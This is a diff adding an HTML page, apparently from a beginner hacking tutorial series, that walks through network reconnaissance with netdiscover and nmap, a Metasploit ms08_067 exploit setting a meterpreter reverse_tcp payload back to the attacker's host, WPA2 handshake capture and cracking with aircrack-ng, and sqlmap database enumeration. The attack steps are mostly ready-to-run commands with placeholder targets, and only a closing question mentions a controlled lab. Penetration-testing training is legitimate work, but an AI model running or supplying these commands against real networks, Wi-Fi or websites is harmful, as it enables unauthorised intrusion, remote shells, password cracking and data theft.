@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="UTF-8">
+            <title>Phase 5&ast;&ast; &colon; Real-World Hacking Scenarios &amp; Practical Applications</title>
+            <style>
+/* From extension vscode.github */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+.vscode-dark img[src$=\#gh-light-mode-only],
+.vscode-light img[src$=\#gh-dark-mode-only],
+.vscode-high-contrast:not(.vscode-high-contrast-light) img[src$=\#gh-light-mode-only],
+.vscode-high-contrast-light img[src$=\#gh-dark-mode-only] {
+	display: none;
+}
+
+</style>
+            
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
+<style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', system-ui, 'Ubuntu', 'Droid Sans', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+        </style>
+        <style>
+.task-list-item {
+    list-style-type: none;
+}
+
+.task-list-item-checkbox {
+    margin-left: -20px;
+    vertical-align: middle;
+    pointer-events: none;
+}
+</style>
+<style>
+:root {
+  --color-note: #0969da;
+  --color-tip: #1a7f37;
+  --color-warning: #9a6700;
+  --color-severe: #bc4c00;
+  --color-caution: #d1242f;
+  --color-important: #8250df;
+}
+
+</style>
+<style>
+@media (prefers-color-scheme: dark) {
+  :root {
+    --color-note: #2f81f7;
+    --color-tip: #3fb950;
+    --color-warning: #d29922;
+    --color-severe: #db6d28;
+    --color-caution: #f85149;
+    --color-important: #a371f7;
+  }
+}
+
+</style>
+<style>
+.markdown-alert {
+  padding: 0.5rem 1rem;
+  margin-bottom: 16px;
+  color: inherit;
+  border-left: .25em solid #888;
+}
+
+.markdown-alert>:first-child {
+  margin-top: 0
+}
+
+.markdown-alert>:last-child {
+  margin-bottom: 0
+}
+
+.markdown-alert .markdown-alert-title {
+  display: flex;
+  font-weight: 500;
+  align-items: center;
+  line-height: 1
+}
+
+.markdown-alert .markdown-alert-title .octicon {
+  margin-right: 0.5rem;
+  display: inline-block;
+  overflow: visible !important;
+  vertical-align: text-bottom;
+  fill: currentColor;
+}
+
+.markdown-alert.markdown-alert-note {
+  border-left-color: var(--color-note);
+}
+
+.markdown-alert.markdown-alert-note .markdown-alert-title {
+  color: var(--color-note);
+}
+
+.markdown-alert.markdown-alert-important {
+  border-left-color: var(--color-important);
+}
+
+.markdown-alert.markdown-alert-important .markdown-alert-title {
+  color: var(--color-important);
+}
+
+.markdown-alert.markdown-alert-warning {
+  border-left-color: var(--color-warning);
+}
+
+.markdown-alert.markdown-alert-warning .markdown-alert-title {
+  color: var(--color-warning);
+}
+
+.markdown-alert.markdown-alert-tip {
+  border-left-color: var(--color-tip);
+}
+
+.markdown-alert.markdown-alert-tip .markdown-alert-title {
+  color: var(--color-tip);
+}
+
+.markdown-alert.markdown-alert-caution {
+  border-left-color: var(--color-caution);
+}
+
+.markdown-alert.markdown-alert-caution .markdown-alert-title {
+  color: var(--color-caution);
+}
+
+</style>
+        
+        </head>
+        <body class="vscode-body vscode-light">
+            <link rel="stylesheet" href="style.css">
+<h1 id="phase-5--real-world-hacking-scenarios--practical-applications">Phase 4 : Real-World Hacking Scenarios &amp; Practical Applications</h1>
+<p><strong>We’ll start with basic attacks and move to advanced penetration testing. Let’s begin!</strong></p>
+<h2 id="scenario-1-network-scanning--reconnaissance">Scenario 1: Network Scanning &amp; Reconnaissance</h2>
+<h3 id="-goal-find-vulnerabilities-in-a-target-network"><strong>🎯 Goal:</strong> Find vulnerabilities in a target network.</h3>
+<blockquote>
+<h3 id="️-tools-used"><strong>🛠️ Tools Used:</strong></h3>
+<blockquote>
+<ul>
+<li><strong>Nmap</strong></li>
+<li><strong>Netdiscover</strong></li>
+</ul>
+</blockquote>
+</blockquote>
+<hr>
+<h3 id="step-1-find-active-devices-on-a-network">Step 1: Find Active Devices on a Network</h3>
+<p><strong>Run the following command to list all devices connected to the network:</strong></p>
+<pre><code class="language-bash">sudo netdiscover
+</code></pre>
+<h3 id="step-2-scan-open-ports-on-a-target">Step 2: Scan Open Ports on a Target</h3>
+<pre><code class="language-bash">nmap -sV -A TARGET_IP
+</code></pre>
+<p><strong>✔ This helps identify open ports and running services.</strong></p>
+<hr>
+<h2 id="scenario-2-exploiting-a-vulnerability-with-metasploit">Scenario 2: Exploiting a Vulnerability with Metasploit</h2>
+<h3 id="-goal-exploit-a-vulnerable-system-and-gain-access"><strong>🎯 Goal:</strong> Exploit a vulnerable system and gain access.</h3>
+<blockquote>
+<h3 id="️-tools-used-1"><strong>🛠️ Tools Used:</strong></h3>
+<blockquote>
+<ul>
+<li><strong>Metasploit Framework</strong></li>
+</ul>
+</blockquote>
+</blockquote>
+<hr>
+<h3 id="step-1-launch-metasploit">Step 1: Launch Metasploit</h3>
+<pre><code class="language-bash">msfconsole
+</code></pre>
+<h3 id="step-2-search-for-an-exploit">Step 2: Search for an Exploit</h3>
+<p><strong>For example, if the target is running an old Windows system, search for exploits:</strong></p>
+<pre><code class="language-bash">search ms08_067
+</code></pre>
+<h3 id="step-3-set-the-exploit-and-run">Step 3: Set the Exploit and Run</h3>
+<pre><code class="language-bash">use exploit/windows/smb/ms08_067_netapi
+<span class="hljs-built_in">set</span> RHOSTS TARGET_IP
+<span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp
+<span class="hljs-built_in">set</span> LHOST YOUR_IP
+exploit
+</code></pre>
+<h4 id="-if-successful-you-gain-a-reverse-shell"><strong>✔ If successful, you gain a reverse shell!</strong></h4>
+<hr>
+<h2 id="scenario-3-wi-fi-hacking-wpa2-handshake-capture">Scenario 3: Wi-Fi Hacking (WPA2 Handshake Capture)</h2>
+<h3 id="-goal-capture-and-crack-a-wi-fi-password"><strong>🎯 Goal:</strong> Capture and crack a Wi-Fi password.</h3>
+<blockquote>
+<h3 id="️-tools-used-2"><strong>🛠️ Tools Used:</strong></h3>
+<blockquote>
+<ul>
+<li><strong>Aircrack-ng</strong></li>
+<li><strong>Wireshark</strong></li>
+</ul>
+</blockquote>
+</blockquote>
+<h3 id="step-1-put-wireless-adapter-in-monitor-mode">Step 1: Put Wireless Adapter in Monitor Mode</h3>
+<pre><code class="language-bash">sudo airmon-ng start wlan0
+</code></pre>
+<h3 id="step-2-scan-available-networks">Step 2: Scan Available Networks</h3>
+<pre><code class="language-bash">sudo airodump-ng wlan0mon
+</code></pre>
+<h3 id="step-3-capture-handshake">Step 3: Capture Handshake</h3>
+<pre><code class="language-bash">sudo airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon
+</code></pre>
+<h3 id="step-4-crack-the-password">Step 4: Crack the Password</h3>
+<pre><code class="language-bash">sudo aircrack-ng -w rockyou.txt -b BSSID capture.cap
+</code></pre>
+<h3 id="-if-successful-youll-see-the-wi-fi-password"><strong>✔ If successful, you’ll see the Wi-Fi password!</strong></h3>
+<h2 id="scenario-4-sql-injection-attack-on-a-website">Scenario 4: SQL Injection Attack on a Website</h2>
+<h3 id="-goal-extract-data-from-a-vulnerable-website-database"><strong>🎯 Goal:</strong> Extract data from a vulnerable website database.</h3>
+<blockquote>
+<h3 id="️-tools-used-3"><strong>🛠️ Tools Used:</strong></h3>
+<blockquote>
+<ul>
+<li><strong>SQLmap</strong></li>
+</ul>
+</blockquote>
+</blockquote>
+<h3 id="step-1-check-if-a-website-is-vulnerable">Step 1: Check if a Website is Vulnerable</h3>
+<pre><code class="language-bash">sqlmap -u <span class="hljs-string">&quot;http://target.com/index.php?id=1&quot;</span> --dbs
+</code></pre>
+<h3 id="-if-vulnerable-youll-see-database-names"><strong>✔ If vulnerable, you’ll see database names!</strong></h3>
+<h3 id="next-steps"><strong>Next Steps:</strong></h3>
+<ul>
+<li><strong>Refine techniques in a controlled lab environment?</strong></li>
+<li><strong>Or, explore advanced methodologies and strategic applications?</strong></li>
+</ul>
+<h5 id="-guts-to-continue-to-the-next-step"><a href="next-step.html"><strong>→ Guts to Continue to the Next Step</strong></a></h5>
+
+            
+            
+        </body>
+        </html>
